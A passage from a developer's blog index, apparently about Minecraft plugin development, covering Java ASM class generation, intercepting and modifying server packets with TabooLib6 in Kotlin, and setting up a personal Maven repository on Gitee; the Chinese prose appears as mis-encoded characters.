string">"team/redrock/coldrain/asmtest/HelloWorldASM"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">"java/lang/Object"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        MethodVisitor mv <span class="token operator">=</span> cw<span class="token punctuation">.</span><span class="token function">visitMethod</span><span class="token punctuation">(</span>Opcodes<span class="token punctuation">.</span>ACC_PUBLIC <span class="token operator">+</span> Opcodes<span class="token punctuation">.</span>ACC_STATIC<span class="token punctuation">,</span> <span class="token string">"main"</span><span class="token punctuation">,</span> <span class="token string">"([Ljava/lang/String;)V"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        mv<span class="token punctuation">.</span><span class="token function">visitFieldInsn</span><span class="token punctuation">(</span>Opcodes<span class="token punctuation">.</span>GETSTATIC<span class="token punctuation">,</span> <span class="token string">"java/lang/System"</span><span class="token punctuation">,</span> <span class="token string">"out"</span><span class="token punctuation">,</span> <span class="token string">"Ljava/io/PrintStream;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        mv<span class="token punctuation">.</span><span class="token function">visitLdcInsn</span><span class="token punctuation">(</span><span class="token string">"Hello ASM!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        mv<span class="token punctuation">.</span><span class="token function">visitMethodInsn</span><span class="token punctuation">(</span>Opcodes<span class="token punctuation">.</span>INVOKEVIRTUAL<span class="token punctuation">,</span> <span class="token string">"java/io/PrintStream"</span><span class="token punctuation">,</span> <span class="token string">"println"</span><span class="token punctuation">,</span> <span class="token string">"(Ljava/lang/String;)V"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        mv<span class="token punctuation">.</span><span class="token function">visitInsn</span><span class="token punctuation">(</span>Opcodes<span class="token punctuation">.</span>RETURN<span class="token punctuation">)</span><span class="token punctuation">;</span>        mv<span class="token punctuation">.</span><span class="token function">visitMaxs</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        mv<span class="token punctuation">.</span><span class="token function">visitEnd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cw<span class="token punctuation">.</span><span class="token function">visitEnd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> cw<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    static <span class="token keyword">class</span> MyClassLoader extends ClassLoader <span class="token punctuation">{</span>        <span class="token keyword">public</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">&gt;</span> <span class="token function">defineClass</span><span class="token punctuation">(</span>String name<span class="token punctuation">,</span> byte<span class="token punctuation">[</span><span class="token punctuation">]</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">defineClass</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> b<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> å¤–éƒ¨åº“ </tag>
            
            <tag> ASM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ©ç”¨TabooLib6å‘é€/æ‹¦æˆª/ä¿®æ”¹æ•°æ®åŒ…ä»¥å®ç°æ¢¦æƒ³ä¸­çš„ç‰¹æ€§</title>
      <link href="/2021/09/28/taboolib6-packet-control/"/>
      <url>/2021/09/28/taboolib6-packet-control/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨å¦‚ä»Šçš„æ’ä»¶å¼€å‘è€…ç¤¾åŒºä¸­ï¼Œåˆ©ç”¨NMSåº•å±‚çš„æ•°æ®åŒ…åŠŸèƒ½å®ç°ä¸€äº›æ¸¸æˆç‰¹æ€§å·²ç»ä¸å†ç¨€å¥‡ã€‚ä¾‹å¦‚åé»‘å¤§ä½¬çš„Adyeshachå’ŒAraspleçš„TrMenuï¼Œå®ƒä»¬çš„åŠŸèƒ½å…¨éƒ¨ä¾é æ•°æ®åŒ…å®ç°ã€‚</p><p>æœ¬æ–‡å°†å°è¯•è®©è¯»è€…ä»ä¸€å®šç¨‹åº¦ä¸Šç†è§£æ•°æ®åŒ…ï¼Œè€Œä¸æ˜¯ä»…ä»…æ‰”å‡ºä¸€æ®µä¸€æ®µçš„ä»£ç â€¦</p><p>ç”±äºæ–‡ç« ä½œè€…å¾ˆå°‘æ¶‰çŒ1.17ç‰ˆæœ¬çš„æ’ä»¶å¼€å‘ï¼Œæ‰€ä»¥è¿™ç¯‡æ–‡ç« çš„éƒ¨åˆ†å†…å®¹åªå¯¹1.16.5åŠä»¥ä¸‹ç‰ˆæœ¬é€‚ç”¨</p><p>ç”±äºæ–‡ç« ä½œè€…æ˜¯ä¸ªèœé€¼ï¼Œæ‰€ä»¥éƒ¨åˆ†å†…å®¹ç”šè‡³æ˜¯æ•´ç‰‡æ–‡ç« å¯¹äºæ•°æ®åŒ…çš„è®ºè¿°å¯èƒ½ååˆ†ç‰‡é¢ï¼Œå¤§ä½¬è½»å–·</p><p><strong>æ–‡ç« ä½œè€…ä¹Ÿæ˜¯èœé¸Ÿï¼Œæ–‡ç« å†…å®¹å¦‚æœ‰è°¬è¯¯çƒ¦è¯·å„ä½å¤§ä½¬æŒ‡æ­£</strong></p><h2 id="ä»ä¸€å®šç¨‹åº¦ä¸Šç†è§£æ•°æ®åŒ…"><a href="#ä»ä¸€å®šç¨‹åº¦ä¸Šç†è§£æ•°æ®åŒ…" class="headerlink" title="ä»ä¸€å®šç¨‹åº¦ä¸Šç†è§£æ•°æ®åŒ…"></a>ä»ä¸€å®šç¨‹åº¦ä¸Šç†è§£æ•°æ®åŒ…</h2><p>ä½ ä¹Ÿè®¸å¬è¯´è¿‡æ•°æ®åŒ…è¿™ä¸ªä¸œè¥¿ï¼Œä½†æ˜¯ä½ çœŸçš„çŸ¥é“å®ƒæ˜¯ä»€ä¹ˆå—ï¼Ÿ</p><p>é‚£ä¹ˆä½ æœ‰æ²¡æœ‰æƒ³è¿‡ï¼Œ<strong>æœåŠ¡å™¨</strong>æ˜¯å¦‚ä½•æ§åˆ¶ç©å®¶<strong>å®¢æˆ·ç«¯</strong>çš„æ˜¾ç¤ºæ•ˆæœçš„å‘¢ï¼Ÿ</p><p>ç­”æ¡ˆæ˜¯å‘ç©å®¶å®¢æˆ·ç«¯å‘é€æ•°æ®åŒ…ï¼Œç„¶åå®¢æˆ·ç«¯æŒ‰ç…§æ•°æ®åŒ…çš„å†…å®¹æ‰§è¡Œæ¸¸æˆæ•ˆæœã€‚</p><p>ä¸¾ä¸ªä¾‹å­:</p><blockquote><p>ç©å®¶å› ä¸ºæŸç§åŸå› æ‰£è¡€äº†</p><ol><li>æœåŠ¡ç«¯å°†å†…å­˜ä¸­å‚¨å­˜çš„ç©å®¶è¡€é‡ä¿®æ”¹ä¸ºæ‰£è¡€åçš„å€¼</li><li>å‘å®¢æˆ·ç«¯å‘é€ä¸€ä¸ªPacketPlayOutUpdateHealthæ•°æ®åŒ…</li><li>å®¢æˆ·ç«¯æŒ‰ç…§æ•°æ®åŒ…ä¸­çš„å†…å®¹ä¿®æ”¹äº†ç©å®¶å±å¹•ä¸Šæ˜¾ç¤ºçš„è¡€é‡</li></ol></blockquote><p>é‚£ä¹ˆä½ åº”è¯¥å·²ç»æƒ³åˆ°è¿™ä¸ªç¯èŠ‚æˆ‘ä»¬å¯ä»¥æ€ä¹ˆæ“ä½œäº†</p><blockquote><p>1.æˆ‘ä»¬è‡ªå·±æ‰‹åŠ¨å‘ç©å®¶çš„å®¢æˆ·ç«¯å‘é€æ•°æ®åŒ…ï¼Œè®©ç©å®¶çœ‹åˆ°å‡çš„æ•ˆæœ ï¼ˆæ¯”å¦‚ä¸Šé¢çš„ä¾‹å­ï¼Œæˆ‘ä»¬å¯ä»¥ç»™ç©å®¶åˆ¶é€ ä¸€ä¸ªæ‰£è¡€çš„â€œå‡è±¡â€ï¼‰</p><p>2.æˆ‘ä»¬ä¿®æ”¹æœåŠ¡ç«¯å‘é€çš„æ•°æ®åŒ…ï¼Œä¿®æ”¹é‡Œé¢çš„å­—æ®µï¼Œè®©ç©å®¶çœ‹åˆ°æˆ‘ä»¬æƒ³è®©ä»–ä»¬çœ‹åˆ°çš„æ•ˆæœ (æ¯”å¦‚ç©å®¶æ‰£äº†10ç‚¹è¡€ï¼Œä½†æ˜¯æˆ‘å¯ä»¥è®©ä»–çœ‹èµ·æ¥åªæ‰£äº†1ç‚¹è¡€ï¼Œä½†æ˜¯æœåŠ¡ç«¯é‡Œè®°å½•çš„ç©å®¶çœŸå®ç”Ÿå‘½å€¼ä»ç„¶æ‰£é™¤äº†10ç‚¹)</p><p>3.æ‹¦æˆªæ•°æ®åŒ…ï¼Œç›´æ¥è®©ç©å®¶çœ‹ä¸åˆ°è¿™ä¸ªæ•ˆæœ ï¼ˆç©å®¶è¢«æ‰“äº†ï¼Œå¯ç©å®¶å®¢æˆ·ç«¯ä¸Šæ˜¾ç¤ºæ²¡æœ‰æ‰£è¡€ï¼Œå®é™…ä¸Šæ‰£äº†ï¼‰</p></blockquote><h3 id="æ•°æ®åŒ…çš„å‘½åè§„åˆ™"><a href="#æ•°æ®åŒ…çš„å‘½åè§„åˆ™" class="headerlink" title="æ•°æ®åŒ…çš„å‘½åè§„åˆ™"></a>æ•°æ®åŒ…çš„å‘½åè§„åˆ™</h3><p>æ¯ä¸€ç§æ•°æ®åŒ…éƒ½æ˜¯NMSåº•å±‚çš„ä¸€ä¸ªç±»ï¼Œä»–ä»¬çš„ä½ç½®éƒ½åœ¨net.minecraft.server.&lt;ç‰ˆæœ¬å·&gt;è¿™ä¸ªåŒ…ä¸‹</p><p>æˆ‘ä»¬æ¥æ‹†åˆ†ä¸€ä¸‹PacketPlayOutUpdateHealthè¿™ä¸ªæ•°æ®åŒ…çš„åç§°</p><p>Packet(Play)(Out)(UpdateHealth)</p><p>Play: æ•°æ®åŒ…çš„å‘é€çš„å››ç§çŠ¶æ€ä¹‹ä¸€ ï¼ˆHandShake, Status, Login, Playï¼‰</p><p>Out: Out/In -&gt; Outå³ä¸ºæœåŠ¡ç«¯å‘å®¢æˆ·ç«¯å‘é€çš„æ•°æ®åŒ…ï¼ŒInåˆ™ç›¸å</p><p>UpdateHealth: è¿™ä¸ªæ•°æ®åŒ…çš„ä½œç”¨ï¼Œè¿™é‡Œæ˜¯æŒ‡æ›´æ–°ç©å®¶å®¢æˆ·ç«¯çš„å¥åº·çŠ¶æ€</p><p>ç”±æ­¤æˆ‘ä»¬ä¾¿å¤§è‡´å¯ä»¥çŒœæµ‹æ•°æ®åŒ…çš„ä½œç”¨</p><p>å½“ç„¶ï¼Œå¦‚æœä½ ä¸æ˜¯å¾ˆç¡®å®šçš„è¯ï¼Œè¿˜æ˜¯æŸ¥æŸ¥<a href="https://wiki.vg/Protocol#Interact_Entity">Protocol - wiki.vg</a>å§</p><h3 id="æ•°æ®åŒ…å­—æ®µ"><a href="#æ•°æ®åŒ…å­—æ®µ" class="headerlink" title="æ•°æ®åŒ…å­—æ®µ"></a>æ•°æ®åŒ…å­—æ®µ</h3><p>åœ¨æˆ‘ä»¬é€šè¿‡åç¼–è¯‘æŸ¥çœ‹æ•°æ®åŒ…ç±»çš„å†…å®¹æ—¶ï¼Œä¸€èˆ¬æˆ‘ä»¬ä¼šå‘ç°ä¸€äº›å­—æ®µã€‚è¿™äº›å­—æ®µçš„å­—æ®µåä¸€èˆ¬éƒ½æ˜¯aï¼Œbï¼Œcä¹‹ç±»çš„å­—æ¯ï¼Œæˆ‘ä»¬æ— æ³•ä»å­—æ®µåä¸­æ¨æµ‹è¿™ä¸ªå­—æ®µçš„å€¼ä»£è¡¨çš„ä¸œè¥¿ã€‚</p><p>è€Œæ— è®ºæ˜¯å‘åŒ…è¿˜æ˜¯ä¿®æ”¹æ•°æ®åŒ…ï¼Œæˆ‘ä»¬éƒ½å¿…é¡»ç†è§£è¿™ä¸ªæ•°æ®åŒ…çš„å­—æ®µæ‰€ä»£è¡¨çš„æ„ä¹‰æ‰è¡Œã€‚</p><p><a href="https://camo.githubusercontent.com/97fa12ece9deff1a46bd47da6b99a25e982091f1c2b4e46c7ff3526620ceb9f3/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343134383538362e706e67"><img src="https://camo.githubusercontent.com/97fa12ece9deff1a46bd47da6b99a25e982091f1c2b4e46c7ff3526620ceb9f3/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343134383538362e706e67" alt="image-20210928084148586"></a></p><p>ä¸€èˆ¬è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¼šæŸ¥é˜…<a href="https://wiki.vg/Protocol#Interact_Entity">Protocol - wiki.vg</a></p><p><a href="https://camo.githubusercontent.com/dc70d6784e1e59e2a5423b583c9ef90dae6f59ff3db7246d579aa3f45a1aa40b/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343434393734342e706e67"><img src="https://camo.githubusercontent.com/dc70d6784e1e59e2a5423b583c9ef90dae6f59ff3db7246d579aa3f45a1aa40b/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343434393734342e706e67" alt="image-20210928084449744"></a></p><p>äºæ˜¯é€šè¿‡æŸ¥è¯¢wikiï¼Œæˆ‘ä»¬åŸºæœ¬ç¡®å®šäº†æ•°æ®åŒ…ä¸­å­—æ®µä»£è¡¨çš„æ„ä¹‰ a -&gt; ç”Ÿå‘½å€¼ b -&gt; é¥±é£Ÿåº¦ c -&gt; é£Ÿç‰©é¥±å’Œåº¦</p><p>è¯·æ³¨æ„ï¼Œ<strong>å°‘æ•°æ—¶å€™åç¼–è¯‘å‡ºæ¥çš„å­—æ®µå¹¶ä¸æŒ‰wikiä¸­è¡¨æ ¼çš„é¡ºåºæ’åˆ—</strong>ï¼ˆä¾‹å¦‚PacketPlayOutExperienceï¼‰ï¼Œä½ éœ€è¦ç»“åˆå­—æ®µç±»å‹æ¥åˆ¤æ–­å­—æ®µåœ¨wikiä¸Šå¯¹åº”çš„å­—æ®µ</p><p>æœ‰æ—¶å¤šä¸ªå­—æ®µç±»å‹ä¸€æ ·ï¼Œåƒä¸‡è¦å¤šè¯•ã€‚</p><p>è™½ç„¶wikiæ˜¯ä¸ªå¾ˆæ–¹ä¾¿çš„ä¸œè¥¿ï¼Œä½†wikiä¸Šä¹Ÿä¸æ˜¯ä»€ä¹ˆéƒ½æœ‰çš„ã€‚äº‹å®ä¸Šï¼Œæœ‰å¾ˆå¤šæ•°æ®åŒ…çš„å­—æ®µï¼Œè¿˜æœ‰ä¸€äº›DataWatcherä¹‹ç±»çš„æ‚ä¸ƒæ‚å…«çš„ä¸œè¥¿æ²¡æœ‰è¢«wikiæ ‡æ³¨å­—æ®µåç§°å’ŒNotesã€‚è¿™æ—¶å€™æˆ‘ä»¬ä¸èƒ½æ€•å›°éš¾ï¼Œæ€¼ç€NMSä»£ç å•ƒå°±å®Œäº‹äº†ï¼</p><p>Tips: æœ‰é’ˆå¯¹æ€§çš„å»å¯»æ‰¾NMSä»£ç ï¼Œä»è·Ÿä½ æƒ³è¦å®ç°çš„åŠŸèƒ½æœ‰ä¸€å®šå…³ç³»çš„BukkitAPIæ–¹æ³•å…¥æ‰‹ï¼Œé¡ºè—¤æ‘¸ç“œè‰åˆ°CraftBukkitå†æº¯æºåˆ°NMS</p><h3 id="ä½¿ç”¨TabooLib6å‘é€-ä¿®æ”¹-æ‹¦æˆªæ•°æ®åŒ…"><a href="#ä½¿ç”¨TabooLib6å‘é€-ä¿®æ”¹-æ‹¦æˆªæ•°æ®åŒ…" class="headerlink" title="ä½¿ç”¨TabooLib6å‘é€/ä¿®æ”¹/æ‹¦æˆªæ•°æ®åŒ…"></a>ä½¿ç”¨TabooLib6å‘é€/ä¿®æ”¹/æ‹¦æˆªæ•°æ®åŒ…</h3><h4 id="å‘é€"><a href="#å‘é€" class="headerlink" title="å‘é€"></a>å‘é€</h4><p>ä½¿ç”¨TabooLibçš„ç‰›é€¼NMSç‰ˆæœ¬æ§åˆ¶å·¥å…·ï¼Œç›´æ¥å†™NMSä»£ç æ¥å‘é€æ•°æ®åŒ…</p><p><strong>æ¥å£éƒ¨åˆ†</strong></p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">interface</span> NMS <span class="token punctuation">{</span>        <span class="token comment">/**     * åˆ·æ–°é¥±é£Ÿåº¦æ¡     *     * @param p ç©å®¶     */</span>    <span class="token keyword">fun</span> <span class="token function">updateFoodBar</span><span class="token punctuation">(</span>p<span class="token operator">:</span> Player<span class="token punctuation">)</span>    <span class="token keyword">companion</span> <span class="token keyword">object</span> <span class="token punctuation">{</span>        <span class="token comment">// ç»è¿‡ç‰ˆæœ¬æ§åˆ¶çš„å®ä¾‹ï¼Œå¯ä»¥åœ¨ä»»æ„ç‰ˆæœ¬æ”¾å¿ƒä½¿ç”¨</span>        <span class="token comment">// åœ¨åŒä¸€ä¸ªåŒ…ä¸‹åˆ›å»ºä¸€ä¸ªå®ç°ç±»ï¼Œå–åä¸º&lt;æ¥å£å&gt;Implå³å¯</span>        <span class="token keyword">val</span> handle <span class="token keyword">by</span> lazy <span class="token punctuation">{</span>            nmsProxy<span class="token operator">&lt;</span>NMS<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>å®ç°éƒ¨åˆ†</strong></p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">class</span> NMSImpl <span class="token operator">:</span> NMS <span class="token punctuation">{</span>        <span class="token comment">// æ²¡é”™ï¼Œç›´æ¥ç”¨nmsï¼Œä¸ç”¨æ‹…å¿ƒç‰ˆæœ¬çš„é—®é¢˜</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">updateFoodBar</span><span class="token punctuation">(</span>p<span class="token operator">:</span> Player<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">val</span> foodData <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token keyword">as</span> CraftPlayer<span class="token punctuation">)</span><span class="token punctuation">.</span>handle<span class="token punctuation">.</span>foodData        p<span class="token punctuation">.</span>handle<span class="token punctuation">.</span>playerConnection<span class="token punctuation">.</span><span class="token function">sendPacket</span><span class="token punctuation">(</span><span class="token function">PacketPlayOutUpdateHealth</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>scaledHealth<span class="token punctuation">,</span> foodData<span class="token punctuation">.</span>foodLevel<span class="token punctuation">,</span> foodData<span class="token punctuation">.</span>saturationLevel<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="æ‹¦æˆª-ä¿®æ”¹"><a href="#æ‹¦æˆª-ä¿®æ”¹" class="headerlink" title="æ‹¦æˆª/ä¿®æ”¹"></a>æ‹¦æˆª/ä¿®æ”¹</h4><p>TabooLib6å°†æœåŠ¡å™¨æ•°æ®åŒ…é€šè®¯åŒ…è£…ä¸ºäº†ä¸¤ä¸ªäº‹ä»¶ï¼Œæˆ‘ä»¬ç›´æ¥é€šè¿‡ç›‘å¬è¿™ä¸ªäº‹ä»¶å³å¯å®ç°æ•°æ®åŒ…çš„æ‹¦æˆªä¸ä¿®æ”¹</p><p>ç›‘å¬åç§°ä¸­å«æœ‰Outè¿™ä¸ªå•è¯çš„æ•°æ®åŒ…å°±ç”¨PacketSendEventï¼ŒInå°±ç”¨PacketReceiveEvent</p><p>æ¥ä¸‹æ¥æˆ‘ç»™æ®µå®ä¾‹ä»£ç ï¼Œè‡ªå·±å»æ‚Ÿå§</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token annotation builtin">@SubscribeEvent</span><span class="token keyword">fun</span> <span class="token function">e</span><span class="token punctuation">(</span>e<span class="token operator">:</span> PacketSendEvent<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// å¯¹æ•°æ®åŒ…ç±»å‹çš„åˆ¤æ–­</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>packet<span class="token punctuation">.</span>name <span class="token operator">==</span> <span class="token string">"PacketPlayOutExperience"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">val</span> v <span class="token operator">=</span> expTempValue<span class="token punctuation">[</span>e<span class="token punctuation">.</span>player<span class="token punctuation">.</span>name<span class="token punctuation">]</span>        <span class="token comment">// è¯»å–æ•°æ®åŒ…ä¸­å­—æ®µçš„å€¼</span>        <span class="token keyword">val</span> level <span class="token operator">=</span> e<span class="token punctuation">.</span>packet<span class="token punctuation">.</span>read<span class="token operator">&lt;</span>Int<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token string">"c"</span><span class="token punctuation">)</span>        <span class="token comment">// å°†å€¼å†™å…¥æ•°æ®åŒ…ä¸­çš„å­—æ®µ</span>        e<span class="token punctuation">.</span>packet<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span> v <span class="token operator">?:</span> <span class="token number">0.0f</span><span class="token punctuation">)</span>        e<span class="token punctuation">.</span>packet<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token comment">// å–æ¶ˆäº‹ä»¶ï¼Œæ„æ€æ˜¯ç›´æ¥æŠŠè¿™ä¸ªæ•°æ®åŒ…æ‹¦æˆªä¸‹æ¥äº†</span>        e<span class="token punctuation">.</span>isCancelled <span class="token operator">=</span> <span class="token boolean">true</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> æ•™ç¨‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> TabooLib </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ©ç”¨Giteeæ­å»ºäº†è‡ªå·±çš„Mavenä»“åº“</title>
      <link href="/2021/09/06/gitee-maven/"/>
      <url>/2021/09/06/gitee-maven/</url>
      
        <content type="html"><![CDATA[<p>é¼“æ£äº†ä¸€æ™šä¸Šç»ˆäºå¼„å‡ºæ¥äº†â€¦â€¦</p><p><a href="https://gitee.com/coldrain-moro/maven">maven: å¯’é›¨çš„mavenä»“åº“ (gitee.com)</a></p><p>ä¹Ÿç®—æ˜¯ç»™è‡ªå·±å½“åˆå·æ‡’æ²¡å»å¤šå¤šäº†è§£mavenè¡¥ä¸Šäº†ä¸€è¯¾ï¼Œå‡ºæ¥æ··ï¼Œè¿Ÿæ—©è¦è¿˜çš„</p><p>ä¹‹æ‰€ä»¥é€‰æ‹©giteeè€Œæ²¡æœ‰é€‰æ‹©githubå½“ç„¶æ˜¯å› ä¸ºé€Ÿåº¦å¿«</p><h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><h3 id="ä¸Šä¼ jaråˆ°ä»“åº“çš„å‘½ä»¤"><a href="#ä¸Šä¼ jaråˆ°ä»“åº“çš„å‘½ä»¤" class="headerlink" title="ä¸Šä¼ jaråˆ°ä»“åº“çš„å‘½ä»¤"></a>ä¸Šä¼ jaråˆ°ä»“åº“çš„å‘½ä»¤</h3><p>åƒè¿™æ ·å†™ä¸Šä¼ äº†Tipharethåˆ°æœ¬åœ°mavenä»“åº“é‡Œ</p><pre class="line-numbers language-none"><code class="language-none">mvn install:install-file -Dfile=E:\ColdRain_Moro\é¡¹ç›®\Tiphareth\build\libs\Tiphareth-1.4.0.jar -DgroupId=ink.ptms.tiphareth -DartifactId=tiphareth -Dversion=1.4.0 -Dpackaging=Jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="æ”¹å˜é»˜è®¤mavenä»“åº“è·¯å¾„"><a href="#æ”¹å˜é»˜è®¤mavenä»“åº“è·¯å¾„" class="headerlink" title="æ”¹å˜é»˜è®¤mavenä»“åº“è·¯å¾„"></a>æ”¹å˜é»˜è®¤mavenä»“åº“è·¯å¾„</h3><p>åœ¨ settings.xml ä¸­ä¸‹æ–‡æ ‡è®°ä½ç½®æ·»åŠ å¦‚ä¸‹å†…å®¹</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>settings</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/SETTINGS/1.2.0<span class="token punctuation">"</span></span>          <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>          <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/SETTINGS/1.2.0 https://maven.apache.org/xsd/settings-1.2.0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token comment">&lt;!-- localRepository   | The path to the local repository maven will use to store artifacts.   |   | Default: ${user.home}/.m2/repository  &lt;localRepository&gt;/path/to/local/repo&lt;/localRepository&gt;ä¸‹é¢æ˜¯è¦æ·»åŠ çš„å†…å®¹  --&gt;</span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>localRepository</span><span class="token punctuation">&gt;</span></span>E:\ColdRain_Moro\é¡¹ç›®\maven\repo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>localRepository</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å¦‚ä½•ä½¿ç”¨"><a href="#å¦‚ä½•ä½¿ç”¨" class="headerlink" title="å¦‚ä½•ä½¿ç”¨"></a>å¦‚ä½•ä½¿ç”¨</h3><p>æˆ‘ä¸€èˆ¬åªç”¨gradleï¼Œæ‰€ä»¥è¿™é‡Œåªæ ‡è®°gradleçš„ä½¿ç”¨æ–¹å¼</p><p><em><strong>gradle yyds</strong></em></p><pre class="line-numbers language-none"><code class="language-none">repositories {    mavenCentral()    // æ·»åŠ æˆ‘çš„ä»“åº“    maven { url = uri("https://gitee.com/coldrain-moro/maven/raw/master/repo") }}dependencies {// å¯¼å…¥ä»“åº“é‡Œçš„ä¾èµ–tiphareth    compileOnly("ink.ptms.tiphareth:tiphareth:1.4.0")    compileOnly("public:PlaceholderAPI:2.10.9@jar")    compileOnly("ink.ptms.core:v11605:11605")    compileOnly(kotlin("stdlib"))    compileOnly(fileTree("libs"))}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> maven </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆè¯•CompletableFuture</title>
      <link href="/2021/08/28/try-completablefuture/"/>
      <url>/2021/08/28/try-completablefuture/</url>
      
